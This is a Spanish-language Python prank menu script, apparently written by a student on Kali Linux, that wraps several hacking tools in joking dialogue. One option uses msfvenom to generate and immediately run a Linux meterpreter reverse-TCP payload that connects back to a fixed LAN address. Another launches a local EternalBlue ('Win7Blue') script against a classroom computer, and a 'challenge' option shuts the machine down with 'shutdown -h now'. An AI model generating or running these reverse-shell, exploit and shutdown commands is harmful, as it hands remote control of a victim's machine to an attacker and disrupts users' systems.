#!/usr/bin/env python

try:
	import subprocess
	from colorama import Fore, Style
	import time
	import os
	import pyperclip

	repositorio = "git clone https://github.com/Samilososami/HashCrack.git"
	reto_rafa = "Has suspendido el Reto de Rafa"


	print(Fore.CYAN + Style.BRIGHT + "-Macho, que es lo que quieres, jooder... " + Style.RESET_ALL)
	print()
	print(Fore.YELLOW + Style.BRIGHT + " [" + Style.RESET_ALL + Fore.GREEN + "info" + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "] " + Style.RESET_ALL + Fore.YELLOW + "Información sobre el script jeje" + Style.RESET_ALL)
	print(Fore.YELLOW + Style.BRIGHT + " [1] " + Style.RESET_ALL + Fore.YELLOW + "Arp-scan")
	print(Fore.YELLOW + Style.BRIGHT + " [2] " + Style.RESET_ALL + Fore.YELLOW + "Quieres saber tu ip eh? jo jo" + Style.RESET_ALL)
	print(Fore.YELLOW + Style.BRIGHT + " [3] " + Style.RESET_ALL + Fore.YELLOW + "Sorpresita sorpresita jo jo" + Style.RESET_ALL)
	print(Fore.YELLOW + Style.BRIGHT + " [4] " + Style.RESET_ALL + Fore.YELLOW + "Meterpreter pa linux jo jo" + Style.RESET_ALL)
	print(Fore.YELLOW + Style.BRIGHT + " [5] " + Style.RESET_ALL + Fore.YELLOW + "Quieres un winblue eh jeje" + Style.RESET_ALL)
	print(Fore.YELLOW + Style.BRIGHT + " [6] " + Style.RESET_ALL + Fore.YELLOW + "Charla con rafa jiji" + Style.RESET_ALL)
	print(Fore.YELLOW + Style.BRIGHT + " [7] " + Style.RESET_ALL + Fore.YELLOW + "Crackear Hash jo jo" + Style.RESET_ALL)
	print(Fore.YELLOW + Style.BRIGHT + " [8] " + Style.RESET_ALL + Fore.YELLOW + "El reto de rafa JO JO JO" + Style.RESET_ALL)
	print()

	opcion = input(Fore.CYAN + Style.BRIGHT + "-Escoge una de las opciones eh...: " + Style.RESET_ALL)


	if opcion.lower() == "1":
		print(Fore.YELLOW + "Jo jo jo que quieres ver las ips de tu red eh jajaja" + Style.RESET_ALL)
		time.sleep(3)
		print()
		os.system("arp-scan --localnet")







	elif opcion.lower() == "2":
		print(Fore.YELLOW + "Con que quieres saber tu ip eh jeje, que te costaba hacer un ifconfig jojo")
		time.sleep(2)
		print()
		print("Bueno, ahi la tienes: " + Style.RESET_ALL)
		time.sleep(1)
		print(Fore.GREEN)
		os.system("hostname -I")
		print(Style.RESET_ALL)

	elif opcion.lower() == "3":
		os.system("wget 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSck5jmbK0t2fWqZMVsid2_ABQl08iUQ5kAX89gpVcVBg&s' > /dev/null 2>&1")
		os.system("mv images\?q=tbn:ANd9GcSck5jmbK0t2fWqZMVsid2_ABQl08iUQ5kAX89gpVcVBg\&s jeje")
		print("Jo jo, sorpresita sorpresita, te doy una pista " + Fore.GREEN +  "jeje" + Style.RESET_ALL)
		time.sleep(1)
		print("Y te doy otra pista porque listo precisamente no eres jo jo  < " + Fore.GREEN +  "display" + Style.RESET_ALL + " >")




	elif opcion.lower() == "4":
		print(Fore.YELLOW + "Este te va a gustar jo jo jo")
		os.system("msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.168.209 lport=1234 -f elf -o reverse_rafa > /dev/null 2>&1")
		print("preparate")
		os.system("chmod +x reverse_rafa")
		os.system("./reverse_rafa")
		print("jo jo jo")


	elif opcion.lower() == "5":
		print(Fore.BLUE+ "jeje, vaya pillo tu eh jo jo, que quieres hackear el ordenador de clase eh jojo" + Style.RESET_ALL)
		time.sleep(3)
		os.system("bash /home/kali/Desktop/Win7Blue/Win7Blue")





	elif opcion.lower() == "6":
		print(Fore.BLUE + "Joder jo jo, asi que quieres hablar conmigo eh jaja")
		time.sleep(1)
		respuesta1 = input(Fore.YELLOW + "A ver, como te ha ido el dia cabroncete? jeje " + Style.RESET_ALL)
		time.sleep(0.5)
		respuesta1 = input(Fore.YELLOW + "Pero bueno, y como es eso? jo jo " + Style.RESET_ALL)
		time.sleep(0.5)
		respuesta1 = input(Fore.YELLOW + "Que curioso jeje, que mas? cuentame jiji " + Style.RESET_ALL)
		time.sleep(0.5)
		print()
		print(Fore.GREEN + "Realmente todo lo que me estas diciendo me da completamente igual jojojo, ")
		time.sleep(2)
		print("se esta almacenando en una variable que luego voy a borrar jijiji " + Style.RESET_ALL)
		time.sleep(3)
		print()
		print(Fore.GREEN + "Venga a estudiar coño JA JA JA, ")
		time.sleep(2)
		print("que he visto que en el directorio de descargas tienes un trabajo de tecnologia casi sin empezar, ")
		time.sleep(3)
		print("acabalo anda jo jo jo" + Style.RESET_ALL)
		os.system("cd /home/kali/Downloads")
		os.system("echo 'Tecnologia, deures: pagina 34, ex 12 i 13. posdata terence jeje' >> tecno_maquines")


	elif opcion.lower() == "info":
			print()
			print("A ver macho, te explico jeje, este script te permite ejecutar diversas funciones cada una mas divertida que la anterior JA JA JA.")
			time.sleep(1)
			print("Mi favorito es el " + Fore.MAGENTA + "sorpresita sorpresita" + Style.RESET_ALL + " je je")


	elif opcion.lower() == "7":
		print()
		print("Pero capullete, usa mi otra herramienta " + Fore.YELLOW + "HashCrack" + Style.RESET_ALL + " JO JO JO, que te cuesta.")
		print("Y como se que eres un vago como yo JE JE JE, te he copiado directamente el comando al portapapeles jojojo")
		pyperclip.copy(repositorio)



	elif opcion.lower() == "8":
		print("Te propongo un " + Fore.RED + "reto" + Style.RESET_ALL + ", JO JO JO, tienes que escribir la siguiente contraseña en tu navegador:")
		time.sleep(2)
		print()
		print(Fore.BLUE + "xF&h1Kv=$mD" + Style.RESET_ALL)
		time.sleep(9)
		pyperclip.copy(reto_rafa)
		print()
		enter = input("Cuando lo hayas hecho presiona enter jo jo...")
		respuesta_reto = input("Has aprobado el reto de rafa? jo jo (S/N): ")

		if respuesta_reto == "S":
			print()
			print(Fore.RED + Style.BRIGHT + "BASTARDO MENTIROSO" + Style.RESET_ALL)
			print("Unicamente el mismisimo " + Fore.GREEN + "RAFAEL ROCA " + Style.RESET_ALL + "puede completarlo!!")
			time.sleep(3)
			print("Asume las " + Fore.RED + Style.BRIGHT + "consequencias")
			time.sleep(4)
			os.system("shutdown -h now")
		
		elif respuesta_reto == "N":
			print()
			print("Me enorgullece tu honestidad, no como el Bruno Lopez JA JA JA")
			print()

		else:
			print()
			print("Escoge " + Fore.YELLOW + "S" + Style.RESET_ALL + " o " + Fore.YELLOW + "N" + Style.RESET_ALL + " mamonzuelo jojojo")






	else:
		print(Style.RESET_ALL + Fore.RED + Style.BRIGHT + "Cabroncete, solo puedes escoger esas opciones jojjo")




























except KeyboardInterrupt:
	print()
	print()
	print(Style.RESET_ALL + Fore.GREEN + "Joder ya te vas? jeje")
	time.sleep(2)
	print(Fore.GREEN + "Haz un truco y desaparece jojo")
	time.sleep(2)
	print(Fore.GREEN + "Espera...Estas oyendo eso?...no puede s-")
	time.sleep(3)
	print(Fore.GREEN + Style.BRIGHT + "AJIAAAAAAAAAAAAAA" + Style.RESET_ALL + Fore.RED)
	time.sleep(2)
	
	
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣷⣶⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣴⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢽⣦⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀")
	print("	    ⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀")
	print("	    ⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀")
	print("	    ⠀⢸⣷⣶⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀")
	print("	    ⠀⢸⣿⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀")
	print("	    ⠀⠈⠀⠺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀")
	print("	    ⠀⠀⠀⠀⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠻⣿⢿⢿⡿⣿⢿⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⢀⠀⠈⣤⣾⣿⣿⣶⣄⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⢿⢻⢻⢻⢹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣽⢴⣜⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣿⢻⢹⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢛⢿⣿⣿⢿⢛⢙⢸⢸⢸⢸⢸⢸⢹⢻⢿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⢱⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢹⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⢸⢹⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣼⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣼⣼⣼⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⢸⣐⡽⠻⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")
	print("	    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⢿⣿⣽⣿⣿⣿⣿⣿⣾⣾⣴⣴⣴⣴⣴⣴⣼⠿⠽⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀")


